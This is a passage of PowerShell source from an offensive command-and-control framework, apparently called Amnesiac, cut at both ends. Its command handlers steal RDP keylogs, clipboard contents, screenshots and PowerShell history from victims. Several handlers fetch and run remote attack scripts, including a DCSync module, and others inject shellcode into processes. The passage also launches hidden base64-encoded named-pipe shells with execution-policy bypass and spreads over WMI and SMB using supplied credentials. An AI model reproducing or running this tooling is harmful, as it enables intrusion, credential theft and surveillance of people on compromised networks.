			$sw.Flush()
		}
		
		elseif($command -eq "RDPKeylogRead"){
			
			$sw.WriteLine('$env:username')
			$sw.Flush()

			$TempUsernameGrab = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$TempUsernameGrab += $line
			}
			
			$sw.WriteLine("try{type c:\Users\Public\Documents\RDP_log.txt | Out-String -Width 4096}catch{}#")
			$sw.Flush()
			
			$KeylogContent = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					if($KeylogContent){
						Write-Output $KeylogContent.Trim()
						Write-Output ""
					}
					break
				}
				$KeylogContent += $line
			}
			
			$counter = 0
			$directory = "c:\Users\Public\Documents\Amnesiac\Keylogger"
			$baseFileName = $TempUsernameGrab + "_" + "RDPKeylog"
			$fileExtension = ".txt"
			$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + $fileExtension)

			# If the file exists, keep incrementing the counter and updating the filename
			while (Test-Path $fileName) {
				$counter++
				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
			}
			
			# Save clipboard to file
			if($KeylogContent){
				[System.IO.File]::WriteAllText($fileName, $KeylogContent)
				Write-Output "[+] RDP Keylog saved to $fileName"
				Write-Output ""
			}
			else {Write-Output "[-] Empty RDP Keylog";Write-Output ""}
			
			continue
			
		}
		
		elseif ($command -like "Upload *") {
			$localFullPath = $command.Split(' ', 2)[1]
			
			# Fetch the actual remote prompt
			$sw.WriteLine('$pwd | Select-Object -ExpandProperty Path')
			$sw.Flush()
			
			$UserPath = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					# Remove any extraneous whitespace, newlines etc.
					$UserPath = $UserPath.Trim()
					break
				} else {
					$UserPath += "$line`n"
				}
			}
			
			if (Test-Path $localFullPath) {
				# Read the local file's content and convert it to Base64
				$fileContentBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($localFullPath))
				
				$remoteFileName = [System.IO.Path]::GetFileName($localFullPath)
				$oneLiner = "[IO.File]::WriteAllBytes('$UserPath\$remoteFileName', [Convert]::FromBase64String('$fileContentBase64'))"
				
				$sw.WriteLine($oneLiner)
				$sw.Flush()
				
				while ($true) {
					$line = $sr.ReadLine()

					if ($line -eq "#END#") {
						break
					}
				}
				
				Write-Output "[+] File uploaded"
				
			} else {
				Write-Output "[-] The file specified does not exist."
			}
			Write-Output ""
			
			continue
		}
		
		elseif ($command -eq "LocalAdminAccess") {
			PrintHelpLocalAdminAccess
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Find-LocalAdminAccess.ps1')")
			$sw.Flush()
		}
		
		elseif ($command -eq "SessionHunter") {
			PrintHelpSessionHunter
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1')")
			$sw.Flush()
		}
		
		elseif ($command -like "help") {
			Get-AvailableCommands
			continue
		}
		
		elseif (($command -eq 'screenshot') -OR ($command -eq 'screen4K')) {
			$predefinedCommands = Get-Command -Command $command
			
			$sw.WriteLine('$env:username')
			$sw.Flush()

			$TempUsernameGrab = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$TempUsernameGrab += $line
			}
			
			$sw.WriteLine("$predefinedCommands")
			$sw.Flush()

			$fileContentBase64 = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$fileContentBase64 += $line
			}
			
			$counter = 0
			$directory = "c:\Users\Public\Documents\Amnesiac\Screenshots"
			$baseFileName = $TempUsernameGrab + "_" + "screenshot"
			$fileExtension = ".png"
			$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + $fileExtension)

			# If the file exists, keep incrementing the counter and updating the filename
			while (Test-Path $fileName) {
				$counter++
				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
			}
			
			# Convert the Base64 string back to bytes and write to a local file
			try{
				[System.IO.File]::WriteAllBytes($fileName, [Convert]::FromBase64String($fileContentBase64))
				Write-Output "[+] Screenshot location: $fileName"
				Write-Output ""
				Invoke-Item "$fileName"
			} catch {Write-Output "[-] Error retrieving screenshot"}
			
			continue
		}
		
		elseif ($command -eq 'DCSync') {
			
			Write-Output ""
			Write-Output "[+] Invoke-DCSync Loaded | https://github.com/vletoux/MakeMeEnterpriseAdmin"
			Write-Output ""
			Write-Output "[+] Usage:"
			Write-Output ""
			Write-Output "    Invoke-DCSync"
			Write-Output "    Invoke-DCSync -Hashcat"
			Write-Output "    Invoke-DCSync -Domain domain.local -DomainController DC01.domain.local"
			
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Sync.ps1')")
			$sw.Flush()
		}
		
		elseif ($command -eq 'History') {
			
			
			$sw.WriteLine('$usersDirectory = "C:\Users";$userDirs = Get-ChildItem -Path $usersDirectory -Directory;$userDirs.Name')
			$sw.Flush()

			$TempUsernameGrab = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$TempUsernameGrab += "$line`n"
			}
			
			$TempUsernameGrab = ($TempUsernameGrab | Out-String) -split "`n"
			$TempUsernameGrab = $TempUsernameGrab.Trim()
			$TempUsernameGrab = $TempUsernameGrab | Where-Object { $_ -ne "" }
			
			foreach ($userDir in $TempUsernameGrab) {
				
				$fulluserpath = "C:\Users\" + $userDir
				$historyFile = Join-Path -Path $fulluserpath -ChildPath 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
			
				$sw.WriteLine("[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('$historyFile'))")
				$sw.Flush()
				
				$fileContentBase64 = ""
				while ($true) {
					$line = $sr.ReadLine()
					if ($line -eq "#END#") {
						break
					}
					$fileContentBase64 += $line
				}
				
				# Convert the Base64 string back to bytes and write to a local file
				$directory = "c:\Users\Public\Documents\Amnesiac\History"
				$baseFileName = $userDir + "_" + "history"
				$fileExtension = ".txt"
				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + $fileExtension)
				
				# If the file exists, keep incrementing the counter and updating the filename
				$counter = 0
				while (Test-Path $fileName) {
					$counter++
					$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
				}
				
				# Convert the Base64 string back to bytes and write to a local file
				try{
					[System.IO.File]::WriteAllBytes($fileName, [Convert]::FromBase64String($fileContentBase64))
					Write-Output "[+] History File Saved to: $fileName"
				} catch {Write-Output "[-] Error retrieving History for user $userDir"}
			
			}
			Write-Output ""
			
			continue
		}
		
		elseif ($command -eq 'Clipboard') {
			
			$sw.WriteLine('$env:username')
			$sw.Flush()

			$TempUsernameGrab = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$TempUsernameGrab += $line
			}
			
			$sw.WriteLine("Get-Clipboard")
			$sw.Flush()

			$ClipboardContent = ""
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "#END#") {
					break
				}
				$ClipboardContent += $line
			}
			
			$counter = 0
			$directory = "c:\Users\Public\Documents\Amnesiac\Clipboard"
			$baseFileName = $TempUsernameGrab + "_" + "Clipboard"
			$fileExtension = ".txt"
			$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + $fileExtension)

			# If the file exists, keep incrementing the counter and updating the filename
			while (Test-Path $fileName) {
				$counter++
				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
			}
			
			# Save clipboard to file
			if($ClipboardContent){
				Write-Output $ClipboardContent.Trim()
				Write-Output ""
				[System.IO.File]::WriteAllText($fileName, $ClipboardContent)
				Write-Output "[+] Clipboard saved to $fileName"
				Write-Output ""
			}
			else {Write-Output "[-] Empty Clipboard";Write-Output ""}
			
			continue
		}
		
		elseif ($command -like "PInject *") {
			
			$commandParts = $command -split '\s+', 3
			$InjectPID = $commandParts[1]
			$InjectHex = $commandParts[2]
			
			$InjectCommand = "PInject /t:1 /f:hex /pid:$InjectPID /sc:$InjectHex /enc:AES"
			
			$sw.WriteLine("$InjectCommand")
			$sw.Flush()
			
			$InjectOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				} else {
					$InjectOutput += "$line`n"
				}
			}
			
			$InjectOutput = $InjectOutput.Trim()
			
			$InjectOutput = ($InjectOutput | Out-String) -split "`n"
			$InjectOutput = $InjectOutput.Trim()
			$InjectOutput = $InjectOutput | Where-Object { $_ -ne "" }
			
			$filtered = $InjectOutput | Where-Object { $_ -match "^\[!\] Process running with" -or $_ -match "^\[\+] Sucessfully injected the shellcode into" -or $_ -match "is not running"}
			
			if($filtered){
				Write-Output ""
				foreach($line in $InjectOutput){
					Write-Output "$line"
				}
				Write-Output ""
			} else {
				Write-Output ""
				Write-Output "[-] Injection Failed. Did you load the module ? [PInject]"
				Write-Output ""
			}
			
			continue
			
		}
		
		elseif ($command -like "ShellGen *") {
			$commandParts = $command -split '\s+', 2
			$shellcommand = $commandParts[1]
			Write-Output ""
			Write-Output "[+] Shellcode (hex):"
			Write-Output ""
			ShellGen -ShCommand $shellcommand
			Write-Output ""
			continue
		}
		
		elseif ($command -like "Migrate *" -OR $command -like "Migrate2 *") {
			
			$commandParts = $command -split '\s+', 2
			$InjectPID = $commandParts[1]
			
			$sw.WriteLine('$([System.Net.Dns]::GetHostByName(($env:computerName)).HostName)')
			$sw.Flush()

			$gatherhostname = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				} else {
					$gatherhostname += "$line`n"
				}
			}

			$gatherhostname = ($gatherhostname | Out-String) -split "`n"
			$gatherhostname = $gatherhostname.Trim()
			$gatherhostname = $gatherhostname | Where-Object { $_ -ne '' -and $_ -ne $null }

			$global:OldPipeNameToRestore = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			
			$PN = $global:MultiPipeName
			
			if($global:Detach){$SID = 'S-1-1-0'}
			else{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
			
			$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
			
			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
			
			if($global:Detach){$finalstring = "powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"}
			else{
				if($command -like "Migrate *"){$finalstring = "powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"}
				elseif($command -like "Migrate2 *"){$finalstring = "powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"}
			}
			
			$ShCodePlaceholder = ShellGen -ShCommand $finalstring
			
			$sw.WriteLine("`$ShCodePlaceholder = `"$ShCodePlaceholder`"")
			$sw.Flush()
			
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				}
			}
			
			$sw.WriteLine("iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1')")
			$sw.Flush()
			
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				}
			}
			
			$sw.WriteLine("`$trimmedShCodePlaceholder = `$ShCodePlaceholder.Trim();PInject /t:1 /f:hex /pid:$InjectPID /sc:`$trimmedShCodePlaceholder /enc:AES")
			$sw.Flush()
			
			$InjectOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					break
				} else {
					$InjectOutput += "$line`n"
				}
			}
			
			$InjectOutput = $InjectOutput.Trim()
			
			$InjectOutput = ($InjectOutput | Out-String) -split "`n"
			$InjectOutput = $InjectOutput.Trim()
			$InjectOutput = $InjectOutput | Where-Object { $_ -ne "" }
			
			$ExitLoop = $False
			
			Write-Output ""
			foreach($line in $InjectOutput){
				Write-Output "$line"
				if($line -like "*not running*" -OR $line -like "*Failed to write*"){$ExitLoop = $True;break}
			}
			Write-Output ""
			
			if($ExitLoop -eq $True){continue}
			
			if($Admin){
				$stoparguments = "delete $serviceToDelete"
				$sw.WriteLine("Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force")
				$sw.Flush()
			}
			
			$global:ScanModer = $True
			$global:OldTargetsToRestore = $global:AllUserDefinedTargets
			$global:AllUserDefinedTargets = $gatherhostname
			$global:RestoreAllUserDefinedTargets = $True
			$global:RestoreOldMultiPipeName = $True
			
			break
			
		}
		
		elseif ($command -like "shell_wmiadmin*") {
			
			$commandParts = $command -split '\s+', 11

			# Initialize the variables to empty strings
			$userdeftargets = ""
			$userdefusername = ""
			$userdefpassword = ""
			$userdefdomain = ""
			$userdefdc = ""

			# Assign values based on their presence
			if ($commandParts -icontains "-Targets") {
				$index = [array]::IndexOf($commandParts, "-Targets", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdeftargets = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-UserName") {
				$index = [array]::IndexOf($commandParts, "-UserName", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefusername = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-Password") {
				$index = [array]::IndexOf($commandParts, "-Password", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefpassword = $commandParts[$index + 1]
			}
			
			if ($commandParts -icontains "-Domain") {
				$index = [array]::IndexOf($commandParts, "-Domain", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdomain = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-DomainController") {
				$index = [array]::IndexOf($commandParts, "-DomainController", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdc = $commandParts[$index + 1]
			}
			
			$global:OldPipeNameToRestore = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			
			$PN = $global:MultiPipeName
			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
			
			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
	
			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
			
			$finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
			
			$finalstring = $finalstring -replace '"', "'"
			
			if($userdefusername -AND $userdefpassword){
				if($userdeftargets){
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `"$finalstring`" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `"$finalstring`" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Command `"$finalstring`" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword")
						$sw.Flush()
					}
				}
				else{
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `"$finalstring`" -NoOutput -UserName $userdefusername -Password $userdefpassword")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `"$finalstring`" -NoOutput -UserName $userdefusername -Password $userdefpassword")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Command `"$finalstring`" -NoOutput -UserName $userdefusername -Password $userdefpassword")
						$sw.Flush()
					}
				}
			}
			else{
				if($userdeftargets){
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `"$finalstring`" -NoOutput -Targets $userdeftargets")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `"$finalstring`" -NoOutput -Targets $userdeftargets")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Command `"$finalstring`" -NoOutput -Targets $userdeftargets")
						$sw.Flush()
					}
				}
				else{
					if($userdefdomain -AND -not $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `"$finalstring`" -NoOutput")
						$sw.Flush()
					}
					elseif($userdefdomain -AND $userdefdc){
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `"$finalstring`" -NoOutput")
						$sw.Flush()
					}
					else{
						$sw.WriteLine("Find-LocalAdminAccess -Method WMI -Command `"$finalstring`" -NoOutput")
						$sw.Flush()
					}
				}
			}
			
			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
					Write-Output $line
				}
			}
			
			$serverOutput = $serverOutput.Trim()
			$serverOutput = ($serverOutput | Out-String) -split "`n"
			$serverOutput = $serverOutput.Trim()
			$serverOutput = $serverOutput | Where-Object { $_ -ne "" }
			
			$adminLines = $serverOutput | Where-Object { $_ -match "has Local Admin access on" }
			$noAccessLines = $serverOutput | Where-Object { $_ -match "No Access" }
			
			if($adminLines.Count -eq 0){
				# Failed to execute
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0){
				# No Admin Access
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0){
				if($Admin){
					$stoparguments = "delete $serviceToDelete"
					$sw.WriteLine("Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force")
					$sw.Flush()
				}
				$TempAdminAccessTargets = $serverOutput | Where-Object { $_ -notmatch "has Local Admin access on" -AND $_ -notmatch "Command execution completed"}
				
				$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [WMI]"
				
				$global:ScanModer = $True
				$global:RestoreOldMultiPipeName = $True
				$global:OldTargetsToRestore = $global:AllUserDefinedTargets
				$global:AllUserDefinedTargets = $TempAdminAccessTargets
				$global:RestoreAllUserDefinedTargets = $True
				Start-Sleep 1
				break
			}
		}
		
		elseif ($command -like "shell_smbadmin*") {
			
			$commandParts = $command -split '\s+', 7
			
			$userdeftargets = ""
			$userdefdomain = ""
			$userdefdc = ""
			
			# Assign values based on their presence
			if ($commandParts -icontains "-Targets") {
				$index = [array]::IndexOf($commandParts, "-Targets", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdeftargets = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-Domain") {
				$index = [array]::IndexOf($commandParts, "-Domain", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdomain = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-DomainController") {
				$index = [array]::IndexOf($commandParts, "-DomainController", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdc = $commandParts[$index + 1]
			}
			
			$global:OldPipeNameToRestore = $global:MultiPipeName
			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
			
			$PN = $global:MultiPipeName
			$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
			
			if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
			else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
	
			$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
			
			$finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
			
			$finalstring = $finalstring -replace '"', "'"
			
			if($userdeftargets){
				if($userdefdomain -AND -not $userdefdc){
					$sw.WriteLine("Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -Command `"$finalstring`" -NoOutput -Targets $userdeftargets")
					$sw.Flush()
				}
				elseif($userdefdomain -AND $userdefdc){
					$sw.WriteLine("Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -DomainController $userdefdc -Command `"$finalstring`" -NoOutput -Targets $userdeftargets")
					$sw.Flush()
				}
				else{
					$sw.WriteLine("Find-LocalAdminAccess -Method SMB -Command `"$finalstring`" -NoOutput -Targets $userdeftargets")
					$sw.Flush()
				}
			}
			
			else{
				if($userdefdomain -AND -not $userdefdc){
					$sw.WriteLine("Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -Command `"$finalstring`" -NoOutput")
					$sw.Flush()
				}
				elseif($userdefdomain -AND $userdefdc){
					$sw.WriteLine("Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -DomainController $userdefdc -Command `"$finalstring`" -NoOutput")
					$sw.Flush()
				}
				else{
					$sw.WriteLine("Find-LocalAdminAccess -Method SMB -Command `"$finalstring`" -NoOutput")
					$sw.Flush()
				}
			}
			
			$serverOutput = ""
			while ($true) {
				$line = $sr.ReadLine()

				if ($line -eq "#END#") {
					Write-Output ""
					break
				} else {
					$serverOutput += "$line`n"
					Write-Output $line
				}
			}
			
			$serverOutput = $serverOutput.Trim()
			$serverOutput = ($serverOutput | Out-String) -split "`n"
			$serverOutput = $serverOutput.Trim()
			$serverOutput = $serverOutput | Where-Object { $_ -ne "" }
			
			$adminLines = $serverOutput | Where-Object { $_ -match "has Local Admin access on" }
			$noAccessLines = $serverOutput | Where-Object { $_ -match "No Access" }
			
			if($adminLines.Count -eq 0){
				# Failed to execute
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0){
				# No Admin Access
				$global:MultiPipeName = $global:OldPipeNameToRestore
				$global:ScanModer = $False
				continue
			}
			
			elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0){
				if($Admin){
					$stoparguments = "delete $serviceToDelete"
					$sw.WriteLine("Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force")
					$sw.Flush()
				}
				$TempAdminAccessTargets = $serverOutput | Where-Object { $_ -notmatch "has Local Admin access on" -AND $_ -notmatch "Command execution completed"}
				
				$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [SMB]"
				
				$global:ScanModer = $True
				$global:RestoreOldMultiPipeName = $True
				$global:OldTargetsToRestore = $global:AllUserDefinedTargets
				$global:AllUserDefinedTargets = $TempAdminAccessTargets
				$global:RestoreAllUserDefinedTargets = $True
				Start-Sleep 1
				break
			}
		}
		
		elseif ($command -like "shell_psadmin*") {
			
			$commandParts = $command -split '\s+', 11

			# Initialize the variables to empty strings
			$userdeftargets = ""
			$userdefusername = ""
			$userdefpassword = ""
			$userdefdomain = ""
			$userdefdc = ""

			# Assign values based on their presence
			if ($commandParts -icontains "-Targets") {
				$index = [array]::IndexOf($commandParts, "-Targets", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdeftargets = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-UserName") {
				$index = [array]::IndexOf($commandParts, "-UserName", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefusername = $commandParts[$index + 1]
			}

			if ($commandParts -icontains "-Password") {
				$index = [array]::IndexOf($commandParts, "-Password", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefpassword = $commandParts[$index + 1]
			}
			
			if ($commandParts -icontains "-Domain") {
				$index = [array]::IndexOf($commandParts, "-Domain", [System.StringComparison]::CurrentCultureIgnoreCase)
				$userdefdomain = $commandParts[$index + 1]
